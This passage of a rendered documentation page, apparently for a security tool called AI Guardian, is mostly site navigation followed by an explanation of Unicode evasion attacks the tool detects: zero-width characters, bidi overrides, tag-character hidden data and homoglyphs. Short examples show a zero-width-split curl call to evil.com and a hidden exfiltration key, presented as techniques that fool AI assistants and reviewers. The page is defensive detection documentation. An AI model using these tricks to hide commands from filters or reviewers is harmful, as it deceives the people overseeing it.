+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SDK
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SDK
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SDK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/guarded-agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GuardedAgent
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/sdk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scanning Pipeline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OBSERVABILITY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Observability / OTEL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Console
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Console
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONSOLE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TUI and Web Console
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AGENT_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDE Sessions and Agent Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HOOKS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hooks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MCP_SERVER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP Security Advisor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MULTI_DAEMON_TRAY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi-Daemon Tray
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDE Integrations
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IDE Integrations
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GITHUB_COPILOT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GitHub Copilot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AIDER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Aider
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AIDERDESK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AiderDesk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PRE_COMMIT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pre-commit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operations
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Operations
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kubernetes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kubernetes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/container/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Container
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PATTERN_SERVER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pattern Server
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MULTI_ENGINE_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi-Engine Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ML_ENGINE_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ML Engine Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VIOLATION_LOGGING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Violation Logging
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reference
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reference
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TOOL_POLICY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tool Policy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PERMISSIONS_COMPARISON/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Permissions Comparison
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TOML_PATTERNS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TOML Patterns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/contributing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contributing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/releasing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Releasing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/changelog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Changelog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-types-detected" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Types Detected
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Types Detected">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-zero-width-characters-invisible-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Zero-Width Characters (Invisible Characters)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-bidirectional-override-characters-text-reversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Bidirectional Override Characters (Text Reversal)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tag-characters-hidden-data-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Tag Characters (Hidden Data Encoding)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-homoglyphs-look-alike-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Homoglyphs (Look-Alike Characters)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Homoglyphs (Look-Alike Characters)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cyrillic-latin-most-common" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cyrillic → Latin (Most Common)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#greek-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Greek → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mathematical-alphanumeric-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mathematical Alphanumeric → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fullwidth-latin-ascii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fullwidth Latin → ASCII
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cherokeecoptic-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cherokee/Coptic → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#action-modes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Action Modes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Strict Mode
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Examples
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Examples">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#zero-width-character-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Width Character Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bidirectional-override-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bidirectional Override Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#homoglyph-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Homoglyph Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-metadata-endpoint-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 1: Metadata Endpoint Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-visual-deception-in-code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 2: Visual Deception in Code Review
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-allowlist-bypass-via-homoglyphs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 3: Allowlist Bypass via Homoglyphs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#integration-with-other-protections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Integration with Other Protections
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Integration with Other Protections">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + SSRF Protection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#prompt-injection-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + Prompt Injection Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secret-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + Secret Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Impact
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        False Positives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="False Positives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#legitimate-use-cases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Legitimate Use Cases
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reducing-false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reducing False Positives
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-developers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Developers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-security-teams" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Security Teams
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-code-reviewers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Code Reviewers
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#research-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Research Background
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technical Details
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Details">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#character-detection-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Character Detection Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#homoglyph-detection-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Homoglyph Detection Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#see-also" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        See Also
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#version-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version History
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="unicode-based-attack-detection">Unicode-Based Attack Detection<a class="headerlink" href="#unicode-based-attack-detection" title="Permanent link">&para;</a></h1>
+<p>AI Guardian detects Unicode-based attacks that bypass traditional pattern matching through invisible characters, visual deception, and character substitution.</p>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>Unicode attacks exploit special characters to:
+- <strong>Hide malicious commands</strong> using invisible characters
+- <strong>Reverse text visually</strong> while keeping malicious code intact
+- <strong>Bypass allowlists</strong> by substituting look-alike characters
+- <strong>Encode hidden data</strong> in deprecated tag characters</p>
+<p>These attacks are particularly effective against AI assistants and code analysis tools that rely on visual pattern matching.</p>
+<h2 id="attack-types-detected">Attack Types Detected<a class="headerlink" href="#attack-types-detected" title="Permanent link">&para;</a></h2>
+<h3 id="1-zero-width-characters-invisible-characters">1. Zero-Width Characters (Invisible Characters)<a class="headerlink" href="#1-zero-width-characters-invisible-characters" title="Permanent link">&para;</a></h3>
+<p><strong>What they are:</strong> Unicode characters that are invisible to humans but visible to computers. They break pattern matching by inserting invisible separators into commands.</p>
+<p><strong>Characters detected (9 types):</strong>
+- <code>U+200B</code> Zero-width space (​)
+- <code>U+200C</code> Zero-width non-joiner (‌)
+- <code>U+200D</code> Zero-width joiner (‍)
+- <code>U+FEFF</code> Zero-width no-break space / BOM (﻿)
+- <code>U+2060</code> Word joiner (⁠)
+- <code>U+2061</code> Function application (⁡)
+- <code>U+2062</code> Invisible times (⁢)
+- <code>U+2063</code> Invisible separator (⁣)
+- <code>U+2064</code> Invisible plus (⁤)</p>
+<p><strong>Example Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># Visually looks like: curl http://safe-domain.com
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a># Actually contains: cur​l http://evil.com (zero-width space after &#39;cur&#39;)
+</code></pre></div></p>
+<p><strong>Why it's dangerous:</strong>
+- Breaks regex patterns: <code>curl</code> doesn't match <code>cur​l</code>
+- Invisible to human reviewers
+- Can hide entire commands or URLs
+- Bypasses most security filters</p>
+<p><strong>Detection:</strong> AI Guardian scans for any occurrence of these characters and reports their Unicode code points and positions.</p>
+<hr />
+<h3 id="2-bidirectional-override-characters-text-reversal">2. Bidirectional Override Characters (Text Reversal)<a class="headerlink" href="#2-bidirectional-override-characters-text-reversal" title="Permanent link">&para;</a></h3>
+<p><strong>What they are:</strong> Unicode control characters that reverse the visual display order of text without changing the actual character sequence.</p>
+<p><strong>Characters detected (2 types):</strong>
+- <code>U+202E</code> Right-to-left override (‮)
+- <code>U+202D</code> Left-to-right override (‭)</p>
+<p><strong>Example Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Visually appears as: access_token = &quot;safe_value&quot;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># Actually executed as: access_token = &quot;eulav_liam_ot_dnes&quot;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">access_token</span> <span class="o">=</span> <span class="s2">&quot;‮send_to_mail_value‬&quot;</span> <span class="c1"># notsecret</span>
+</code></pre></div></p>
+<p><strong>Real-world scenario:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Looks like: echo &quot;Installing dependencies...&quot;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># Actually runs: echo &quot;...seicnedneped gnitalsni&quot;‮</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;‮Installing dependencies...&quot;</span>
+</code></pre></div></p>
+<p><strong>Why it's dangerous:</strong>
+- Visual deception - code looks safe but executes maliciously
+- Hard to detect in code reviews
+- Can hide sensitive data exfiltration
+- Bypasses visual inspection</p>
+<p><strong>Detection:</strong> AI Guardian flags any occurrence of bidi override characters and shows both visual and actual character order.</p>
+<hr />
+<h3 id="3-tag-characters-hidden-data-encoding">3. Tag Characters (Hidden Data Encoding)<a class="headerlink" href="#3-tag-characters-hidden-data-encoding" title="Permanent link">&para;</a></h3>
+<p><strong>What they are:</strong> Deprecated Unicode tag characters (U+E0000 - U+E007F) originally designed for language tagging. Now used to encode hidden data.</p>
+<p><strong>Why they're dangerous:</strong>
+- Invisible to most text editors
+- Can encode entire hidden messages
+- Deprecated but still supported
+- Used for steganography attacks</p>
+<p><strong>Example Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Looks like: print(&quot;Hello World&quot;)
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a># Contains hidden tag characters encoding: &quot;EXFIL_KEY=abc123&quot;
+</code></pre></div></p>
+<p><strong>Detection:</strong> AI Guardian scans the entire Unicode tag character range and reports any occurrences.</p>
+<hr />
+<h3 id="4-homoglyphs-look-alike-characters">4. Homoglyphs (Look-Alike Characters)<a class="headerlink" href="#4-homoglyphs-look-alike-characters" title="Permanent link">&para;</a></h3>
+<p><strong>What they are:</strong> Characters from different alphabets (Cyrillic, Greek, Mathematical, Cherokee, Coptic) that look identical to Latin characters but have different Unicode code points.</p>
+<p><strong>80+ homoglyph pairs detected</strong> including:</p>
+<h4 id="cyrillic-latin-most-common">Cyrillic → Latin (Most Common)<a class="headerlink" href="#cyrillic-latin-most-common" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Cyrillic</th>
+<th>Latin</th>
+<th>Unicode Points</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>а</td>
+<td>a</td>
+<td>U+0430 → U+0061</td>
+</tr>
+<tr>
+<td>е</td>
+<td>e</td>
+<td>U+0435 → U+0065</td>
+</tr>
+<tr>
+<td>о</td>
+<td>o</td>
+<td>U+043E → U+006F</td>
+</tr>
+<tr>
+<td>р</td>
+<td>p</td>
+<td>U+0440 → U+0070</td>
+</tr>
+<tr>
+<td>с</td>
+<td>c</td>
+<td>U+0441 → U+0063</td>
+</tr>
+<tr>
+<td>х</td>
+<td>x</td>
+<td>U+0445 → U+0078</td>
+</tr>
+</tbody>
+</table>
+<h4 id="greek-latin">Greek → Latin<a class="headerlink" href="#greek-latin" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Greek</th>
+<th>Latin</th>
+<th>Unicode Points</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>α</td>
+<td>a</td>
+<td>U+03B1 → U+0061</td>
+</tr>
+<tr>
+<td>ε</td>
+<td>e</td>
+<td>U+03B5 → U+0065</td>
+</tr>
+<tr>
+<td>ο</td>
+<td>o</td>
+<td>U+03BF → U+006F</td>
+</tr>
+<tr>
+<td>ν</td>
+<td>v</td>
+<td>U+03BD → U+0076</td>
+</tr>
+<tr>
+<td>ρ</td>
+<td>p</td>
+<td>U+03C1 → U+0070</td>
+</tr>
+</tbody>
+</table>
+<h4 id="mathematical-alphanumeric-latin">Mathematical Alphanumeric → Latin<a class="headerlink" href="#mathematical-alphanumeric-latin" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Mathematical</th>
+<th>Latin</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>𝐚</td>
+<td>a</td>
+<td>Bold mathematical</td>
+</tr>
+<tr>
+<td>𝐛</td>
+<td>b</td>
+<td>Bold mathematical</td>
+</tr>
